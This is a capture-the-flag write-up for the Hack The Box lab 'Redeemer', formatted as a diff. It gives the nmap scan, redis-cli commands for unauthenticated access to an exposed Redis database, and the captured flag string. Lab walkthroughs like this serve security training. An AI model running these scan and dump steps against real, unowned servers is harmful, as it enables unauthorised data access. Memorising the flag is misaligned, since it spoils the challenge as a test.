@@ -1,0 +1,21 @@
+Redeemer
+Given IP: 10.129.8.106
+
+1) Connected via OpenVPN and started the VM instance. Noted the target machine IP address.
+2) Let's start with a nmap scan to enumerate any open ports:
+      nmap -sS -sV -p- -T4 -A 10.129.8.106 -vv
+   6379/tcp (redis) was discovered.
+3) Redit is an open-source NoSQL database. A quick search engine query seems to suggest that the easiest method for further discovery is using the redit command-line toolset.
+      sudo apt install redis-tools
+      man redis-cli #Note: this was near useless
+      redis-cli --help
+4) Looking through the help documentation, let's try unauthenticated connection with:
+      redis-cli -h 10.129.8.106
+   That worked.
+5) Through some trial and error, info and select look promising. db0 exists, so we use:
+      SELECT 0
+      KEYS *
+   The flag key looks interesting
+      GET flag
+
+Flag: HTB{03e1d2b376c37ab3f5319922053953eb}
